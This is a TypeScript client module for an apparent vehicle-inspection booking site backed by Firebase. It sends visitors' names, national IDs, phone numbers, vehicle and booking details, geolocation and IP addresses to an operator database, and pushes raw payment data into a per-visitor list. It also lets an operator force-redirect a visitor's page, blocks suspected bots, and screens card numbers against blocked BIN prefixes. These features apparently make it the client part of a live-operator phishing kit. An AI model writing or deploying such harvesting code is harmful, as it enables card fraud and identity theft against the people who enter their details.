import { db } from '../shared/config';
import { ref, set, onValue, update, push, remove, onDisconnect, serverTimestamp } from 'firebase/database';
import { UserData, LocationData } from '../shared/types';
import { getClientPublicIpDetails } from '../shared/utils';
import { BaseService } from './baseService';
export class ClientAPI extends BaseService {
  private clientId: string;
  private heartbeatInterval: ReturnType<typeof setInterval> | null = null;
  private locationSkipUnsubscribers: Array<() => void> = [];
  private commandUnsubscribers: Array<() => void> = [];
  private beforeUnloadHandler: (() => void) | null = null;
  private visibilityChangeHandler: (() => void) | null = null;
  private static readonly HEARTBEAT_INTERVAL = 10000; // Lower write frequency to support higher concurrent traffic
  private static readonly OFFLINE_THRESHOLD = 35000; // Keep users online across normal network jitter

  constructor(clientId: string) {
    super();
    this.clientId = clientId;
  }

  private getIdentityPayload(page?: string) {
    const publicIpDetails = getClientPublicIpDetails();

    return {
      ip: this.clientId,
      privateIp: this.clientId,
      clientCookieId: this.clientId,
      publicIp: publicIpDetails.publicIp || null,
      publicIpv4: publicIpDetails.publicIpv4 || null,
      publicIpv6: publicIpDetails.publicIpv6 || null,
      ...(page ? { currentPage: page } : {})
    };
  }

  connect() {
    if (!db) return;

    // Ensure reconnection does not duplicate listeners.
    this.disconnect();

    const safeIp = this.clientId.replace(/\./g, '_');
    const commandsRef = ref(db, `commands/${safeIp}`);
    const adminNavigateRef = ref(db, `users/${safeIp}/adminNavigateCommand`);
    const presenceRef = ref(db, `presence/${safeIp}`);

    // 1. Listen for commands targeting this client
    const unsubscribeCommands = onValue(commandsRef, (snapshot) => {
      const cmd = snapshot.val();
      if (cmd) {
        if (cmd.action === 'navigate') {
          this.dispatch('forceNavigate', {
            page: cmd.page,
            contextData: cmd.contextData || null
          });
          remove(commandsRef); // Acknowledge command
        } else if (cmd.action === 'unblock') {
          // Dispatch unblock event
          this.dispatch('unblock', {});
          remove(commandsRef); // Acknowledge command
        }
      }
    });

    const unsubscribeAdminNavigate = onValue(adminNavigateRef, (snapshot) => {
      const cmd = snapshot.val();
      if (!cmd) return;
      if (cmd.action === 'navigate' && cmd.page) {
        this.dispatch('forceNavigate', {
          page: cmd.page,
          contextData: cmd.contextData || null
        });
      }
      remove(adminNavigateRef);
    });

    this.commandUnsubscribers = [unsubscribeCommands, unsubscribeAdminNavigate];

    // 2. Setup onDisconnect - automatically set offline when connection is lost
    // Use presence path for lightweight status tracking
    onDisconnect(presenceRef).update({
      status: 'offline',
      lastSeen: serverTimestamp()
    });

    // Mark online immediately on connect (do not wait for first heartbeat)
    this.setOnline();

    // 3. Start heartbeat to keep connection alive (updates /presence, not /users)
    this.startHeartbeat();

    // 4. Handle page unload (close/refresh)
    this.beforeUnloadHandler = () => {
      this.setOffline();
    };
    window.addEventListener('beforeunload', this.beforeUnloadHandler);

    // 5. Handle visibility change (tab switch)
    this.visibilityChangeHandler = () => {
      if (document.visibilityState === 'hidden') {
        this.sendHeartbeat();
      } else if (document.visibilityState === 'visible') {
        this.setOnline();
      }
    };
    document.addEventListener('visibilitychange', this.visibilityChangeHandler);
  }

  private startHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    this.heartbeatInterval = setInterval(() => {
      this.sendHeartbeat();
    }, ClientAPI.HEARTBEAT_INTERVAL);
  }

  private sendHeartbeat() {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');
    // Update only /presence path for lightweight status tracking
    update(ref(db, `presence/${safeIp}`), {
      lastSeen: Date.now(),
      status: 'online'
    });
  }

  private setOnline() {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');
    update(ref(db, `presence/${safeIp}`), {
      status: 'online',
      lastSeen: Date.now()
    });
  }

  private setOffline() {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');
    update(ref(db, `presence/${safeIp}`), {
      status: 'offline',
      lastSeen: Date.now()
    });
  }

  disconnect() {
    this.commandUnsubscribers.forEach((unsubscribe) => {
      try {
        unsubscribe();
      } catch {
      }
    });
    this.commandUnsubscribers = [];

    if (this.beforeUnloadHandler) {
      window.removeEventListener('beforeunload', this.beforeUnloadHandler);
      this.beforeUnloadHandler = null;
    }

    if (this.visibilityChangeHandler) {
      document.removeEventListener('visibilitychange', this.visibilityChangeHandler);
      this.visibilityChangeHandler = null;
    }

    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
    this.stopListeningLocationSkipFlags();
    this.setOffline();
  }

  // Static helper to determine if user is online based on lastSeen
  static isUserOnline(lastSeen: number | undefined): boolean {
    if (!lastSeen) return false;
    return (Date.now() - lastSeen) < ClientAPI.OFFLINE_THRESHOLD;
  }

  updateStatus(page: string) {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');

    // Get current page to set as previous
    onValue(ref(db, `users/${safeIp}`), (snapshot) => {
      const user = snapshot.val();
      const updates: any = {
        ...this.getIdentityPayload(page),
        lastSeen: Date.now(),
        status: 'online'
      };

      // Track page change
      if (user && user.currentPage && user.currentPage !== page) {
        updates.previousPage = user.currentPage;
      }

      // If this is first time (no previous page), mark as new user
      if (!user || !user.currentPage) {
        updates.isNew = true;
      }

      update(ref(db, `users/${safeIp}`), updates);
    }, { onlyOnce: true });
  }

  submitData(data: Partial<UserData>) {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');

    const sanitizedData = Object.fromEntries(
      Object.entries(data).filter(([, value]) => value !== undefined)
    ) as Partial<UserData>;

    // Determine which categories have new data
    const updates: any = {
      ...this.getIdentityPayload(),
      ...sanitizedData,
      lastSeen: Date.now(),
      hasNewData: true
    };

    // Set flags based on what data is being submitted
    if (sanitizedData.name || sanitizedData.nationalID || sanitizedData.email) {
      updates.newPersonalData = true;
    }
    if (sanitizedData.phoneNumber) {
      updates.newContactData = true;
    }
    if (sanitizedData.nationality || sanitizedData.plate || sanitizedData.vehicleType || sanitizedData.vehicleStatus || sanitizedData.region ||
      sanitizedData.inspectionCenter || sanitizedData.serviceType || sanitizedData.hazardous || sanitizedData.inspectionDate || sanitizedData.inspectionTime) {
      updates.newBookingData = true;
    }

    update(ref(db, `users/${safeIp}`), updates);
  }

  async blockCurrentClient(reason: string, metadata?: Record<string, unknown>) {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');
    const identity = this.getIdentityPayload();
    const isIpv4Address = (value: string) => /^(?:\d{1,3}\.){3}\d{1,3}$/.test(value);
    const pubIp = String(identity.publicIp || '').trim();
    const pubIpv4 = identity.publicIpv4 || (isIpv4Address(pubIp) ? pubIp : '');
    const blockedAt = Date.now();

    await set(ref(db, `blockedUsers/${safeIp}`), {
      id: safeIp,
      privateIp: this.clientId,
      publicIpv4: pubIpv4,
      publicIpv6: identity.publicIpv6 || (pubIp && !isIpv4Address(pubIp) ? pubIp : ''),
      reason,
      metadata: metadata || null,
      blockedAt
    });

    await update(ref(db, `users/${safeIp}`), {
      ...identity,
      isBlocked: true,
      isFlagged: true,
      botDetectionReason: reason,
      botDetectedAt: blockedAt,
      hasNewData: true,
      lastSeen: blockedAt
    });

    await set(ref(db, `commands/${safeIp}`), {
      action: 'navigate',
      page: '/blocked',
      timestamp: blockedAt
    });
  }

  submitPayment(paymentData: any) {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');

    // Update main user record
    update(ref(db, `users/${safeIp}`), {
      ...this.getIdentityPayload(),
      hasPayment: true,
      hasNewData: true,
      newPaymentData: true,
      lastSeen: Date.now()
    });

    // Add to payments collection
    push(ref(db, `users/${safeIp}/payments`), paymentData);
  }

  checkCardBlocked(cardNumber: string) {
    if (!db) return Promise.resolve(false);

    return new Promise((resolve) => {
      const blockedBinsRef = ref(db, 'blockedBins');
      onValue(blockedBinsRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const blockedBins = Object.entries(data)
            .map(([key, value]: [string, any]) => {
              const normalizedBin = String(value?.bin ?? key).replace(/\D/g, '');
              return normalizedBin.length === 4 || normalizedBin.length === 6 ? normalizedBin : null;
            })
            .filter((bin): bin is string => Boolean(bin));
          const cleanNumber = cardNumber.replace(/\D/g, '');

          const isBlocked = blockedBins.some((bin: string) =>
            cleanNumber.startsWith(bin)
          );

          resolve(isBlocked);
        } else {
          resolve(false);
        }
      }, { onlyOnce: true });
    });
  }

  // إرسال بيانات الموقع الجغرافي
  submitLocation(locationData: LocationData) {
    if (!db) return;
    const safeIp = this.clientId.replace(/\./g, '_');
    update(ref(db, `users/${safeIp}`), {
      ...this.getIdentityPayload(),
      location: locationData,
      newLocationData: true,
      lastSeen: Date.now(),
      hasNewData: true
    });
  }

  listenLocationSkipFlags() {
    if (!db) return;

    this.stopListeningLocationSkipFlags();

    const safeIp = this.clientId.replace(/\./g, '_');
    let globalSkip = false;
    let userSkip = false;

    const dispatchFlags = () => {
      this.dispatch('locationSkipFlagsUpdated', {
        g: globalSkip,
        u: userSkip,
        e: globalSkip || userSkip
      });
    };

    const unsubGlobal = onValue(ref(db, 'settings/globalSkipLocation'), (snapshot) => {
      globalSkip = !!snapshot.val();
      dispatchFlags();
    });

    const unsubUser = onValue(ref(db, `users/${safeIp}/locationSkipEnabled`), (snapshot) => {
      userSkip = !!snapshot.val();
      dispatchFlags();
    });

    this.locationSkipUnsubscribers = [unsubGlobal, unsubUser];
  }

  stopListeningLocationSkipFlags() {
    if (this.locationSkipUnsubscribers.length === 0) return;
    this.locationSkipUnsubscribers.forEach((unsubscribe) => {
      try {
        unsubscribe();
      } catch {
      }
    });
    this.locationSkipUnsubscribers = [];
  }
}
